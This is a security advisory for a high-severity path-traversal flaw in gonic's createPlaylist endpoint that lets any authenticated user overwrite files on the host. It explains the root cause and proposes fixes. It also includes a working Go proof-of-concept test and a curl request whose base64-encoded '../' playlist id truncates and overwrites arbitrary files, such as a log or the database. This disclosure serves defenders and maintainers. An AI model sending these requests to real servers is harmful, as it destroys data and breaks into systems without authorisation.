# [H] gonic has arbitrary file write in createPlaylist: any authenticated user can write playlist M3U content to attacker-controlled path on the host

## Summary
Severity: High
Advisory: GHSA-4gxv-p5g5-j7w7
CVE: CVE-2026-49340
CWE: CWE-22, CWE-697, CWE-732
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-4gxv-p5g5-j7w7
Type: github-advisory

## Affected
- Go: `go.senan.xyz/gonic` — affected >=0 <0.21.0

## Details
## Summary

A logic error in `ServeCreateOrUpdatePlaylist` allows **any authenticated Subsonic user** (including non-admin) to write playlist M3U content to an attacker-controlled absolute filesystem path on the gonic host, and to create intermediate directories with `0o777` permissions.

The bug is independent of the playlist ownership IDOR fixed in [`6dd71e6`](https://github.com/sentriz/gonic/commit/6dd71e6): it is an **unreachable guard clause** combined with **no path containment in `Store.Write`**.

## Root cause — unreachable guard clause

`server/ctrlsubsonic/handlers_playlist.go:74-90`:

```go
func (c *Controller) ServeCreateOrUpdatePlaylist(r *http.Request) *spec.Response {
    user := r.Context().Value(CtxUser).(*db.User)
    params := r.Context().Value(CtxParams).(params.Params)

    playlistID, _ := params.GetFirstID("id", "playlistId")
    playlistPath := playlistIDDecode(playlistID)   // attacker-controlled, base64-decoded

    var playlist playlistp.Playlist
    if playlistPath != "" {
        if pl, err := c.playlistStore.Read(playlistPath); err != nil && pl != nil {
            //                                              ^^^^^^^^^^^^^^^^^^^^^^^^^
            //                                              this condition is UNREACHABLE
            playlist = *pl
        }
    }

    if playlist.UserID != 0 && playlist.UserID != user.ID {
        return spec.NewError(50, "you aren't allowed update that user's playlist")
    }
    ...
```

`playlist.Store.Read` (`playlist/playlist.go:88-144`) returns either `(*Playlist, nil)` on success or `(nil, err)` on any failure path. **There is no return path of `(non-nil, non-nil-err)`.**

So the inner branch `err != nil && pl != nil` is **always false**, the `playlist = *pl` assignment never executes, and `playlist` stays at its zero value with `UserID = 0`. The subsequent guard `playlist.UserID != 0 && playlist.UserID != user.ID` simplifies to `false && (anything)` and **always passes**, regardless of who owns the target path.

## Root cause — no path containment in `Store.Write`

`playlist/playlist.go:146-160`:

```go
func (s *Store) Write(relPath string, playlist *Playlist) error {
    defer lock(&s.mu)()
    if err := sanityCheck(s.basePath); err != nil {
        return err
    }
    absPath := filepath.Join(s.basePath, relPath)
    if err := os.MkdirAll(filepath.Dir(absPath), 0o777); err != nil {  // world-writable!
        return fmt.Errorf("make m3u base dir: %w", err)
    }
    file, err := os.OpenFile(absPath, os.O_RDWR|os.O_CREATE, 0o666)    // create-or-open
    ...
    if err := file.Truncate(0); err != nil {                            // wipe existing
        ...
    }
```

`filepath.Join("/var/lib/gonic/playlists", "../../etc/cron.daily/anything")` resolves to `/var/lib/gonic/etc/cron.daily/anything` — Go's `filepath.Join` does NOT prevent `..` traversal. Combined with the missing guard above, **any authenticated user** controls the destination path.

## Live PoC — passing Go test

Drop this into `server/ctrlsubsonic/handlers_playlist_write_traversal_test.go` and run `go test -run TestCreatePlaylistArbitraryWrite_RawPath ./server/ctrlsubsonic/ -v`:

```go
package ctrlsubsonic

import (
	"net/url"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestCreatePlaylistArbitraryWrite_RawPath(t *testing.T) {
	f := newFixture(t)

	// playlistStore.basePath = <tmp>/playlists/. A relPath of "../injected.m3u"
	// resolves under the parent <tmp> dir — escaping the playlists/ subtree.
	traversalRel := filepath.Join("..", "injected.m3u")
	traversalID := playlistIDEncode(traversalRel).String()

	// f.alt is the NON-ADMIN user (ID=2).
	resp := f.query(t, f.contr.ServeCreateOrUpdatePlaylist, f.alt, url.Values{
		"id":   {traversalID},
		"name": {"injected-by-low-priv-user"},
	})
	t.Logf("resp: %+v", string(resp))

	tmpDir := filepath.Dir(f.contr.musicPaths[0].Path)
	target := filepath.Join(tmpDir, "injected.m3u")
	stat, err := os.Stat(target)
	require.NoError(t, err, "VULNERABLE if the file exists outside playlists/")
	require.False(t, stat.IsDir())

	contents, err := os.ReadFile(target)
	require.NoError(t, err)
	t.Logf("VULNERABLE — file written at %s\n%s", target, string(contents))
}
```

Test output against current `master` HEAD `6dd71e6`:

```
=== RUN   TestCreatePlaylistArbitraryWrite_RawPath
    resp: {"subsonic-response":{"status":"ok","version":"1.15.0","type":"gonic","openSubsonic":true,
        "playlist":{"id":"pl-Li4vaW5qZWN0ZWQubTN1","name":"injected-by-low-priv-user",...,
        "owner":"alt","songCount":0,...}}}
    VULNERABLE — file written at /var/folders/.../TestCreatePlaylistArbitraryWrite_RawPath.../001/injected.m3u
        #GONIC-NAME:"injected-by-low-priv-user"
        #GONIC-COMMENT:""
        #GONIC-IS-PUBLIC:"false"
--- PASS: TestCreatePlaylistArbitraryWrite_RawPath (0.05s)
```

The file was created at `<tmp>/injected.m3u` while the playlist store's basePath is `<tmp>/playlists/` — write succeeded outside the intended directory.

## HTTP-level reproduction

```bash
# Target a writable path on the gonic host.
# Encode "../../../var/log/anything.log" (note: gonic must be able to write there)
RAW='../../../var/log/anything.log'
ID="pl-$(printf '%s' "$RAW" | base64 -w0 | tr '/+' '_-')"

curl -s "http://gonic-host/rest/createPlaylist.view?u=lowpriv&p=pass&c=poc&v=1.16.1&f=json&id=$ID&name=injected" \
  | python3 -m json.tool
# Response: {"subsonic-response":{"status":"ok",...}}
# Side effect: file written at /var/log/anything.log with M3U structured content,
# intermediate directories created with 0o777 permissions.
```

## Impact

- **Integrity**: Any authenticated user can overwrite (truncate-and-rewrite) any file the gonic process has write access to: gonic's own SQLite database, configuration files, log files, cache, audit trails, M3U files of other users. The write is M3U-structured (`#GONIC-NAME: / #GONIC-COMMENT: / #GONIC-IS-PUBLIC:` attributes, plus song paths), but the `name` value is attacker-controlled and structurally placed (no newline injection; `strconv.Quote` escapes specials).
- **Availability**: Overwriting `gonic.db` (or wherever the SQLite file lives) destroys all user state — accounts, ratings, playlists, etc. The write is unrecoverable.
- **Filesystem state**: `MkdirAll(dir, 0o777)` creates intermediate directories as world-writable, regardless of the umask, which is itself a hardening issue alongside the traversal.
- **Trust boundary**: gonic explicitly supports a non-admin user role (`ServeCreateUser`, the `IsAdmin` flag). This bug grants every non-admin user a destructive filesystem-write primitive into the host process's working set.
- **Content control is structural** (cannot inject newlines into the M3U attribute lines), so direct shell/web-shell injection requires a target file format that tolerates the `#GONIC-NAME:"..."` header. Pure-destructive primitives (overwrite/truncate, fill-by-mkdir) work universally.

## CVSS

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` = **8.1 High**

## Suggested fix

Two changes, either of which mitigates this:

**1. Fix the unreachable guard at `handlers_playlist.go:83`**:

```go
// Currently (BROKEN):
if pl, err := c.playlistStore.Read(playlistPath); err != nil && pl != nil {
    playlist = *pl
}

// Fixed:
if pl, err := c.playlistStore.Read(playlistPath); err == nil && pl != nil {
    playlist = *pl
}
```

This restores the ownership check for the case where the path resolves to an existing playlist. It does NOT fix the case where `playlistPath` points to a non-existent file (the Read fails, `playlist` stays zero-valued, ownership check still bypassed). So the second fix is also needed.

**2. Add path containment in `playlist/playlist.go::Store.Write`** (same helper proposed in the companion advisory):

```go
absPath := filepath.Join(s.basePath, relPath)
rel, err := filepath.Rel(s.basePath, absPath)
if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
    return fmt.Errorf("path %q escapes playlist directory", relPath)
}
```

Apply the same guard in `Read()` and `Delete()` to close related primitives. Consider tightening `MkdirAll` from `0o777` to `0o755`.

## Credits

Reported by Vishal Shukla ([@shukla304](https://github.com/shukla304) / [@therawdev](https://github.com/therawdev)).

## References
- https://github.com/sentriz/gonic/security/advisories/GHSA-4gxv-p5g5-j7w7
- https://nvd.nist.gov/vuln/detail/CVE-2026-49340
- https://github.com/sentriz/gonic
